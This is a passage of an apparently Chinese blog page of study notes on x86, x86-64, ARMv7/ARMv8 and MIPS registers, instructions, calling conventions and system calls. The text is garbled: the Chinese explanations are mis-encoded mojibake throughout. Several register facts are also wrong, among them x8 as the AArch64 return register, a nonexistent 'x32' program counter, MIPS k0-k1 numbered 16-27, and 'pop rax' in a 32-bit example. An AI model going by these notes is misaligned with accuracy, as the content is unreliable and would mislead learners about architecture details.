</span><br></pre></td></tr></table></figure><ul><li>mips æµ‹è¯•, ä¸armç±»ä¼¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><ul><li>CISC</li></ul><h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><ul><li>intel x86 é€šç”¨å¯„å­˜å™¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; é€šç”¨</span><br><span class="line">eax: ç´¯åŠ å™¨</span><br><span class="line">ebx: ä¸€èˆ¬åŸºå€å¯„å­˜å™¨ï¼Œbase</span><br><span class="line">ecx: counter, åœ¨loopæ—¶ï¼Œé»˜è®¤è®¡æ•°</span><br><span class="line">edx: ä¸€èˆ¬ç”¨äºå­˜æ”¾data</span><br><span class="line"></span><br><span class="line">esi: source index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨</span><br><span class="line">edi: destinatin index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨</span><br><span class="line"></span><br><span class="line">esp: stack pointer, æ ˆé¡¶</span><br><span class="line">ebp: base pointer, æ ˆåŸºå€</span><br><span class="line"></span><br><span class="line">eip: æŒ‡å‘å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure><ul><li>æ ‡å¿—ä½ <code>eflags</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CF: carry flag, è¿›ä½</span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, ç¬¦å·</span><br><span class="line">OF: overflow, æº¢å‡º</span><br><span class="line">TF: trap, è·Ÿè¸ª</span><br><span class="line">IF: interrupt, ä¸­æ–­</span><br><span class="line">PF: parity, å¥‡å¶</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>æ®µå¯„å­˜å™¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cs: code segment ä»£ç æ®µ</span><br><span class="line">ds: data æ•°æ®æ®µ</span><br><span class="line">ss: stack å †æ ˆæ®µ</span><br><span class="line">es: extend æ‰©å±•æ®µ</span><br><span class="line">fs: æ•°æ®æ®µ</span><br><span class="line">gs: æ•°æ®æ®µ</span><br></pre></td></tr></table></figure><ul><li>æ§åˆ¶å¯„å­˜å™¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; æŸäº›ä¿æŠ¤æ¨¡å¼</span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure><ul><li>å¯»å€</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure><ul><li>ç®—æœ¯æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">; åŸºæœ¬è¿ç®—</span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; é€»è¾‘è¿ç®—</span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; ç§»ä½æ“ä½œ</span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left ç®—æ•°å·¦ç§»</span><br><span class="line">sar</span><br></pre></td></tr></table></figure><ul><li>è·³è½¬</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; jmp ç±»</span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call function</span><br><span class="line">; call æ‰§è¡Œæ—¶ï¼Œä¿å­˜ eip+4, å¹¶è·³è½¬åˆ°å¯¹åº”åœ°å€</span><br><span class="line">; å‚æ•°ä¼ é€’ï¼Œä½¿ç”¨æ ˆä¼ é€’å‚æ•°</span><br></pre></td></tr></table></figure><ul><li>æ ˆå¸§</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; åœ¨è°ƒç”¨å­ç¨‹åºæ—¶ï¼Œä¼šå¼€è¾Ÿå­ç¨‹åºçš„æ ˆå¸§ã€‚espå’Œebpä¿å­˜æ ˆé¡¶å’Œæ ˆåº•</span><br><span class="line">; åœ¨è¿”å›çˆ¶ç¨‹åºéœ€è¦è¿˜åŸesp, ebpæŒ‡é’ˆã€‚</span><br><span class="line">; æ ˆ ä½åœ°å€ç”Ÿé•¿</span><br><span class="line"></span><br><span class="line">; spè‡ªåŠ¨å˜åŒ–</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿè°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; ç³»ç»Ÿä¸­æ–­å¤„ç†syscall</span><br><span class="line">int 0x80            ; eaxç³»ç»Ÿè°ƒç”¨å· ebx, ecx, edxå¯¹åº”å‡½æ•°å‰ä¸‰ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><ul><li><p>å®é™…ä¸Šx86-64ä¸AMD64åŸºæœ¬æ˜¯åŒä¸€ä¸ªISAï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨è´­ä¹°çš„Intelæˆ–è€…AMDç”Ÿäº§çš„CPUï¼Œéƒ½å±äºx86-64çš„ISAã€‚</p></li><li><p>x86-64: 64ä½ï¼Œå¯å¯»å€ <code>2^64</code>, å…¼å®¹x86</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 32ä½ r-&gt;bæ¯”å¦‚ rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32ä½ å¯„å­˜å™¨ï¼Œä½32ä½</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è°ƒç”¨çº¦å®š, ä¸x86ç›¸å·®è¾ƒå¤§</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; å‡½æ•°å‚æ•°</span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; ä¼ é€’å‰6ä¸ªå‚æ•°ï¼Œç¬¬7ä¸ªå‚æ•°å¼€å§‹å’Œx86ä¸€æ ·ä½¿ç”¨æ ˆä¼ é€’</span><br><span class="line"></span><br><span class="line">; è¿”å›å€¼</span><br><span class="line">rax</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿè°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">; å‚æ•°ä¼ é€’ä¸å‡½æ•°ä¸€è‡´ï¼Œ rdi, rsi...</span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul><li><p>RISC</p></li><li><p>ARMæŒ‡ä»¤æ ¼å¼</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@ æ›´åŠ å­¦æœ¯ rd: destination; rn: å¯„å­˜å™¨ä¸­ç”¨äºç®—æœ¯è¿ç®—çš„æ“ä½œæ•°; shifter_operand: æ•°æ®å¤„ç†æŒ‡ä»¤</span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@ æ³¨é‡Š  `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure><h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><ul><li><p>32ä½æŒ‡ä»¤é›†<code>A32</code>ï¼Œå…¼å®¹16ä½æŒ‡ä»¤é›†<code>T16</code></p><ul><li>ç”±äºARMv7 å…¼å®¹ <code>ARM</code>å’Œ <code>Thumb</code>æŒ‡ä»¤é›†ï¼ŒåŒºåˆ†ä¸¤ä¸ªæŒ‡ä»¤é›†ï¼š <code>addr &amp; 1 == 1</code>ä»£è¡¨<code>thumb</code>æŒ‡ä»¤é›†</li></ul></li><li><p>ARMv7é€šç”¨å¯„å­˜å™¨</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: args, å‡½æ•°å‰å››ä¸ªå‚æ•°ï¼Œè¿”å›å€¼ä¹Ÿä¼šå­˜å…¥r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, åœ¨æ–°ç‰ˆæœ¬å½“ä½œé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ï¼Œä¼šåœ¨blæ—¶å¼•å‘bug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, æŒ‡å‘ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure><ul><li>æ ‡å¿—ä½(CPSR: program status reg),å¦‚æœæƒ³æ”¹å˜ï¼Œéœ€è¦åœ¨æŸäº›æŒ‡ä»¤ååŠ  <code>s</code> (sub -&gt; subs)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">N: negative, è¿ç®—ç»“æœ&gt;=0 N=0, è´Ÿæ•°ï¼ŒN=1</span><br><span class="line">Z: zero, ä¸º0</span><br><span class="line">C: carry, è¿›ä½</span><br><span class="line">V: overflow æœ‰æº¢å‡º</span><br><span class="line"></span><br><span class="line">; cmp å¯ä»¥æ”¹å˜</span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure><ul><li>mov ç«‹å³æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@ ç‰¹æ®Šå¯„å­˜å™¨ cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure><ul><li>è®¿é—®å†…å­˜</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@ ä¸èƒ½ç›´æ¥åƒintel movè®¿é—®å†…å­˜, ä½¿ç”¨ load, storeå‘½ä»¤é—´æ¥è®¿é—®å†…å­˜</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; ä¾‹å­</span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002ï¼ŒåŠ è½½åœ°å€åˆ°å¯„å­˜å™¨ </span><br><span class="line">str r1, [r0]         @ r1 ä¸­çš„å€¼å†™å…¥åˆ° r0 ä¸­æ‰€ä¿å­˜çš„åœ°å€ä¸­</span><br></pre></td></tr></table></figure><ul><li>ç®—æœ¯æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@ åŸºæœ¬ç®—æ•°è¿ç®—</span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ æƒ³æ”¹å˜æ ‡å¿—ä½, åŠ  &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ é€»è¾‘è¿ç®—</span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ ç§»ä½æ“ä½œ</span><br><span class="line">lsl   @ logic shift left é€»è¾‘å·¦ç§»</span><br><span class="line">lsr   @ é€»è¾‘å³ç§»</span><br><span class="line">asr   @ arithmetic shift right ç®—æ•°å³ç§»</span><br><span class="line">ror   @ rotate right å¾ªç¯å³ç§»</span><br></pre></td></tr></table></figure><ul><li>ç¨‹åºè·³è½¬</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b: ç›´æ¥è·³åˆ°labelã€‚ branch</span><br><span class="line">bx: è·³è½¬+çŠ¶æ€åˆ‡æ¢    @ ARM/Thumb æ¨¡å¼(ä½¿ç”¨ä¸€æ¬¡ï¼Œåˆ‡æ¢ä¸€æ¬¡)</span><br><span class="line">bl: b + link, é¦–å…ˆä¿å­˜ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€åˆ°lr, ç„¶åæ”¹å˜pcã€‚</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ æ¡ä»¶è·³è½¬, çŠ¶æ€å¯„å­˜å™¨</span><br><span class="line">eq: equal ç›¸ç­‰</span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ ä»ç„¶æ˜¯ä½¿ç”¨ `b` æŒ‡ä»¤è°ƒç”¨å‡½æ•°</span><br></pre></td></tr></table></figure><ul><li>æ ˆå¸§ç›¸å…³</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@ sp, fp ç»´æŠ¤æ ˆå¸§çš„çŠ¶æ€, æ ˆå‘ ä½åœ°å€ç”Ÿé•¿</span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop å¯ä»¥æ“ä½œå¤šä¸ªå¯„å­˜å™¨ï¼Œç”šè‡³å¯ä»¥æ§åˆ¶pc; spè‡ªåŠ¨å˜åŒ–</span><br><span class="line">@ ä¸‹é¢æ˜¯å¸¸è§çš„å‡½æ•°è°ƒç”¨å‡ºç°å‡ºç°çš„gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @ é¡ºåºæ˜¯ push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @ é¡ºåºæ˜¯  pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@ ç­‰ä»·äº push, å…ˆè®¡ç®—spçš„å€¼?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@ ç­‰ä»·äº pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿä¸­æ–­</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ é€šè¿‡vector_swi/svc è·å¾—ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI å½¢å¼</span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI å½¢å¼ï¼Œç«‹å³æ•° immè¢«å¿½ç•¥,ç”±r0å†³å®š</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure><h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><ul><li><p>ä¸ <code>armv7</code> å­˜åœ¨ä¸€å®šçš„åŒºåˆ«</p></li><li><p>64ä½æŒ‡ä»¤é›† <code>aarch64</code>, å…¼å®¹32ä½ <code>aarch32</code></p></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction setï¼›</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure><ul><li>ARMv8 é€šç”¨å¯„å­˜å™¨</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-x7: å‡½æ•°å‰<span class="number">8</span>ä¸ªå‚æ•°å€¼</span><br><span class="line"><span class="symbol">x8:</span> å‡½æ•°è¿”å›å€¼</span><br><span class="line"><span class="symbol">x19</span>-x28: æ²¡ç‰¹æ®Šç”¨é€” </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, æ’<span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, ä¸èƒ½åƒarmv7ä¸€æ ·è¢«ä¿®æ”¹</span><br><span class="line"></span><br><span class="line"><span class="comment">@ ä¹Ÿå¯ä½¿ç”¨32ä½çš„ w0...å¯„å­˜å™¨, å¯æ‰©å±•ä½¿ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ spå¯¹åº”çš„ç‰©ç†å¯„å­˜å™¨æœ‰å¦‚ä¸‹å››ä¸ª(æŸä¸€æ—¶åˆ»åªèƒ½å¯¹åº”ä¸‹é¢å…¶ä¸­ä¸€ä¸ª)</span></span><br><span class="line"><span class="symbol">SP_EL0</span>å’ŒSP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure><ul><li><p>SPSR æ›¿ä»£äº† CPSR</p></li><li><p>å†…å­˜è®¿é—®</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ load &amp; store, å…¼å®¹armv7 ldr</span><br><span class="line">ldp  @ load pair ä¸€å¯¹ã€‚</span><br><span class="line">ldp x8, x2, [x0, #0x10]   @ å°†x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ å‚æ•°ä¼ é€’</span><br><span class="line">x0-x7: å‡½æ•°å‰8ä¸ªå‚æ•°å€¼</span><br><span class="line">x8: å‡½æ•°è¿”å›å€¼</span><br><span class="line"></span><br><span class="line">@ aarch64æ²¡æœ‰pushå’Œpop æŒ‡ä»¤</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿè°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure><ul><li>TrustZone ç›¸å…³<br>xxx</li></ul><h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p><h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><ul><li><p>RISCï¼Œ <code>Microprocessor without Interlocked Pipeline Stages</code></p></li><li><p><code>mips</code> æ˜¯<code>big-endian</code>, mipselæ˜¯ <code>little-endian</code></p></li><li><p>æ ¼å¼</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># æ ¹æ®ä½æ•°</span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line"># æ³¨é‡Šä½¿ç”¨ `#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure><ul><li>é€šç”¨å¯„å­˜å™¨ï¼Œ 32ä¸ª</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># æœ‰å„è‡ªçš„åŠ©è®°ç¬¦ï¼Œçœ‹æ±‡ç¼–æ—¶å¤šä½¿ç”¨åŠ©è®°ç¬¦</span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># æ’0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value å‡½æ•°è¿”å›å€¼</span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  å‡½æ•°å‚æ•°</span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save ä¿ç•™</span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># å¼‚å¸¸æˆ–ä¸­æ–­</span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; ç‰¹æ®Š</span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure><ul><li>æŒ‡ä»¤æ ¼å¼</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r: register format <span class="comment"># ä½¿ç”¨å¯„å­˜å™¨</span></span><br><span class="line">i: immediate       <span class="comment"># ä½¿ç”¨ç«‹å³æ•°</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure><ul><li>å¯»å€</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure><ul><li>è®¿é—®å†…å­˜</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 